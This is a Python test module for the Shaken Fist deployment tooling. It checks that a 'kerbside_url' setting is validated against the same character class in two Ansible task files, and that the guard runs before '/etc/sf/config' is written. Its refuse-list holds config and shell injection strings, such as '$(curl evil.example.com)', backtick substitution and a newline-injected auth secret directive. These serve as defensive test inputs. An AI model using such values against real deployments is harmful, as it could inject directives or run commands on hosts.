# Copyright 2026 Michael Still and contributors

# kerbside_url is validated against the same character class everywhere it is
# rendered unescaped.
#
# The value reaches two files, on two different sets of hosts, so neither check
# can cover the other: the node role's config entry point renders it into
# /etc/sf/config on every Shaken Fist node with it set, including a cluster
# pointing at an externally managed Kerbside with no kerbside group at all; and
# kerbside_source hands it to the kerbside role, which renders it into
# kerbside.ini on each Kerbside host, including a dedicated one which never
# runs config. Two copies of a character class is exactly the kind of drift
# this series pins elsewhere, so pin it here (#4709).

import codecs
import os
import re

import yaml

from shakenfist.tests import base


def _repo_root():
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _role_task(name):
    return os.path.join(
        _repo_root(), 'shakenfist', 'deploy', 'collection', 'roles', 'node', 'tasks', name)


CONFIG_TASKS = _role_task('config.yml')
SOURCE_TASKS = _role_task('kerbside_source.yml')

# The condition as it is written in either file: "kerbside_url is not
# search('<class>')", with nothing else between the variable and the class.
CONDITION = re.compile(r"kerbside_url is not search\('(\[[^']*\])'\)")


def _tasks(path):
    """Every task in a task file, including those nested in a block."""
    with open(path) as f:
        for task in yaml.safe_load(f):
            yield task
            for nested in task.get('block') or []:
                yield nested


def _as_jinja_reads_it(literal):
    """A Jinja single-quoted string literal's value.

    Jinja processes backslash escapes in a string literal before the value
    reaches `search`, so the text in the YAML is not the regular expression
    the test plugin compiles. Writing a literal backslash in the class as a
    single `\\` therefore produces `\\]`, which escapes the closing bracket
    and makes the class unterminated -- an error ansible only raises when the
    task runs. Decode the literal the way Jinja does, so this test judges the
    expression that is actually compiled.
    """
    return codecs.decode(literal, 'unicode_escape')


def _kerbside_url_classes(path):
    """The character classes kerbside_url is checked against in path."""
    classes = []
    for task in _tasks(path):
        for condition in _conditions(task):
            classes.extend(CONDITION.findall(condition))
    return classes


def _conditions(task):
    """An assert task's conditions, as text, or nothing for another module."""
    assertion = task.get('ansible.builtin.assert') or {}
    conditions = assertion.get('that') or []
    if isinstance(conditions, str):
        conditions = [conditions]
    return [str(condition) for condition in conditions]


def _index_of(path, predicate):
    """Where the first task matching predicate runs in path, or None."""
    for index, task in enumerate(_tasks(path)):
        if predicate(task):
            return index
    return None


def _checks_kerbside_url(task):
    return any(CONDITION.search(condition) for condition in _conditions(task))


def _writes_the_config(task):
    template = task.get('ansible.builtin.template') or {}
    return template.get('dest') == '/etc/sf/config'


class KerbsideInjectionContractTestCase(base.ShakenFistTestCase):
    def test_both_entry_points_check_kerbside_url(self):
        for path in (CONFIG_TASKS, SOURCE_TASKS):
            self.assertEqual(
                1, len(_kerbside_url_classes(path)),
                '%s does not check kerbside_url against exactly one character '
                'class. It is rendered unescaped from both config.yml (into '
                '/etc/sf/config) and kerbside_source.yml (into kerbside.ini), '
                'and each runs on hosts the other does not reach, so both need '
                'the check.' % os.path.basename(path))

    def test_the_config_guard_runs_before_the_template(self):
        # A check that runs after the parse is not a check (coding_rules.md):
        # config.yml's guard must refuse kerbside_url before the template task
        # writes the injected value to /etc/sf/config, and moving it below that
        # task would leave every other case in this module green.
        guard = _index_of(CONFIG_TASKS, _checks_kerbside_url)
        writes = _index_of(CONFIG_TASKS, _writes_the_config)
        self.assertIsNotNone(
            writes, 'config.yml no longer has a task templating /etc/sf/config, so this test '
                    'cannot tell whether the kerbside_url guard still runs before it.')
        self.assertIsNotNone(guard, 'config.yml does not check kerbside_url at all.')
        self.assertLess(
            guard, writes,
            'config.yml checks kerbside_url at task %d but writes /etc/sf/config at task %d. The '
            'guard must run first: after the template, the injected value is already on the host '
            'and the check refuses a file it has written.' % (guard, writes))

    def test_the_two_classes_agree(self):
        config = _kerbside_url_classes(CONFIG_TASKS)
        source = _kerbside_url_classes(SOURCE_TASKS)
        self.assertEqual(
            config, source,
            'config.yml checks kerbside_url against %s and kerbside_source.yml '
            'against %s. They render the same value unescaped, so a character '
            'refused by one and allowed by the other is a hole on whichever '
            'hosts run only the laxer check. Update both.' % (config, source))

    def test_the_class_refuses_what_it_is_there_to_refuse(self):
        # ansible's `search` test is re.search with the same syntax, so the
        # class can be run directly here. That matters because config.yml's
        # copy of this check is not reachable from a rootless harness -- it
        # writes /etc/sf -- so this is what proves the class itself, while
        # ci-test-kerbside-wiring.sh proves the identical kerbside_source copy
        # actually fires.
        (literal,) = _kerbside_url_classes(CONFIG_TASKS)
        pattern = _as_jinja_reads_it(literal)
        try:
            re.compile(pattern)
        except re.error as e:
            raise AssertionError(
                'kerbside_url\'s character class %r is not a valid regular '
                'expression once Jinja has decoded the string literal (%r): '
                '%s. ansible raises this only when the task runs.'
                % (literal, pattern, e))
        base = 'https://console.example.com:13002/kerbside'
        refuse = [
            # A newline injects the next line of /etc/sf/config, or of
            # kerbside.ini, as its own directive.
            (base + '\nSHAKENFIST_AUTH_SECRET_SEED="known"', 'a directive'),
            (base + '\rSHAKENFIST_AUTH_SECRET_SEED="known"', 'a directive'),
            # /etc/sf/config emits the value inside double quotes, and is
            # sourced by shell as well as read by systemd
            # (shakenfist/deploy/nodelifecycletests.sh), so each of these runs.
            (base + '"; curl evil.example.com; "', 'closing the quotes'),
            (base + '$(curl evil.example.com)', 'command substitution'),
            (base + '${HOME}', 'parameter expansion'),
            (base + '`curl evil.example.com`', 'backtick substitution'),
            (base + '\\"', 'escaping the quoting'),
        ]
        for value, why in refuse:
            self.assertIsNotNone(
                re.search(pattern, value),
                'kerbside_url %r is accepted by %s, which permits %s.'
                % (value, pattern, why))

        # And it must not refuse a URL an operator legitimately has. A
        # character class that refused these would fail a working deploy on
        # upgrade, which is worse than the injection it prevents.
        for value in (base, 'https://console.example.com', 'http://10.0.0.5:13002',
                      'https://[2001:db8::1]:13002/kerbside',
                      'https://console-1.example.com:13002/a_b-c.d~e'):
            self.assertIsNone(
                re.search(pattern, value),
                'kerbside_url %r is refused by %s, but is a legitimate value.'
                % (value, pattern))
